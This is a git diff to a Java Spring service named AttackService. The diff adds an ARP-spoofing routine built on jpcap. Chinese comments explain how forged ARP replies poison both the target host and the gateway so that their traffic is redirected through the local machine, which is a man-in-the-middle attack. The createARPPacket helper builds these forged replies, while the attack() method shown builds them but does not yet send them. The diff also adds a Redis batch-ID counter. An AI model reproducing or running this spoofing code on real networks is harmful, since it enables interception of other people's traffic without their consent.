@@ -3,10 +3,13 @@ package com.hyc.backend.service;
 import com.hyc.backend.dao.RedisMapper;
 import com.hyc.backend.pojo.AttackConfig;
 import com.hyc.backend.redis.AttackKey;
+import com.hyc.backend.redis.CommonKey;
 import com.hyc.backend.utils.NetworkUtils;
 import jpcap.JpcapCaptor;
 import jpcap.JpcapSender;
 import jpcap.NetworkInterface;
+import jpcap.packet.ARPPacket;
+import jpcap.packet.EthernetPacket;
 import org.slf4j.LoggerFactory;
 import org.springframework.stereotype.Service;
 import org.springframework.util.StringUtils;
@@ -16,6 +19,7 @@ import javax.annotation.Resource;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.util.Date;
 import java.util.Map;
 
 /**
@@ -50,6 +54,9 @@ public class AttackService {
 
     private boolean attacking = false;
 
+    private Date startAttackTimeStamp;
+    private Integer batchId;
+
 
     private long upStreamNum;
     private long downStreamNum;
@@ -65,8 +72,7 @@ public class AttackService {
     @PostConstruct
     public void initDefaultConfig(){
         this.initDeviceList();
-
-        AttackConfig config = (AttackConfig) redisMapper.get(AttackKey.config, "config");
+        AttackConfig config = (AttackConfig) redisMapper.get(AttackKey.config, "config", AttackConfig.class);
         if(config == null){
             String dstIP = "";
             String dstMAC = "";
@@ -107,6 +113,10 @@ public class AttackService {
             redisMapper.set(AttackKey.config, "config", config);
         }
 
+    }
+    @PostConstruct
+    public void initBatchId(){
+        redisMapper.setnx(CommonKey.COMMON_KEY,"batch_id", 0);
     }
 
     public synchronized void updateConfigAndOpenDevice(AttackConfig config) throws IOException {
@@ -162,6 +172,56 @@ public class AttackService {
             }
         }
         return null;
+    }
+
+    public synchronized void attack(){
+        //当前处于攻击状态，说明已经有线程在攻击了，所以当前线程直接返回
+        if(attacking)   return;
+        attacking = true;
+
+        startAttackTimeStamp = new Date();//记录当前时间
+        //为了方便统计数据，我们为每次攻击都设置一个批次ID，即batchId
+        //这个batchId需要是自增的，如何获取一个自增的batchId呢？
+        //那就还从redis里取呗，但是这个batchId必须跟每次攻击的数据包对应好，否则就乱了
+        //OK，那我们就在初始化Servlet的时候，就在Redis里设置一个存id的键，如果不存在，那就创建一个，见方法initBatchId
+        batchId = (Integer) redisMapper.get(CommonKey.COMMON_KEY, "batch_id", Integer.class);
+        //这里没考虑并发修改redis的batchId的问题，因为同一时间只有一个线程会执行攻击方法
+        //因为AttackService默认是单例的，锁上之后，别的线程也没法调用attack方法，也就不会并发修改batchId
+        //但是仍旧是线程不安全的，如果要实现线程安全，可以选择加分布式锁，即执行redis的set lock:batchid true ex 5 nx
+        //这里就不实现了
+        batchId++;
+
+        //设置ARP包欺骗目标主机，将自己伪装成网关
+        ARPPacket arpToDst = createARPPacket(srcMACBT, gateIPIA.getAddress(), dstMACBT, dstIPIA.getAddress());
+
+
+        //设置ARP包欺骗网关，假装自己是目标主机，因此源IP地址需要改成攻击目标的IP地址，但是MAC地址修改成本地主机的MAC地址
+        //这样就能让网关认为本地主机的MAC地址是攻击目标的MAC地址，进而将需要发到目标主机的数据包通过ARP表发到本地主机的网卡上
+        ARPPacket arpToGate = createARPPacket(srcMACBT, dstIPIA.getAddress(), gateMACBT, gateIPIA.getAddress());
+
+
+    }
+
+    private ARPPacket createARPPacket(byte[] sHardAddr, byte[] sProtoAddr,byte[] tHardAddr, byte[] tProtoAddr){
+        ARPPacket arpPacket = new ARPPacket();
+        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
+        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
+        arpPacket.operation = ARPPacket.ARP_REPLY;//设置操作类型为应答
+        arpPacket.hlen = 6;//硬件地址长度
+        arpPacket.plen = 4;//协议类型长度
+        arpPacket.sender_hardaddr = sHardAddr;//发送端MAC地址
+        arpPacket.sender_protoaddr = sProtoAddr;//发送端IP地址
+        arpPacket.target_hardaddr = tHardAddr;//目标MAC地址
+        arpPacket.target_protoaddr = tProtoAddr;//目标IP地址
+
+        //定义以太网首部
+        EthernetPacket ethernetPacket = new EthernetPacket();
+        ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;//设置帧类型为ARP帧
+        ethernetPacket.src_mac = sHardAddr;//源MAC地址
+        ethernetPacket.dst_mac = tHardAddr;//目标MAC地址
+        //添加以太网首部
+        arpPacket.datalink = ethernetPacket;
+        return arpPacket;
     }
 
 
